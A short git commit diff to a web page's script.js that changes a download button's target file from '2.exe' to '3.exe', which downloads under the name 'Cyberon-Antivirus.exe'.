55210e573cbce216ecaf67680347677a3f51f8b5
prog-ammar <ammarofc2005@gmail.com>
2024-12-27 15:09:04 +0500

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 document.getElementById('download-btn').addEventListener('click', () => {
-    const fileUrl = '2.exe'; // Replace with the actual file path
+    const fileUrl = '3.exe'; // Replace with the actual file path
     const anchor = document.createElement('a');
     anchor.href = fileUrl;
     anchor.download = 'Cyberon-Antivirus.exe'; // The file name for download
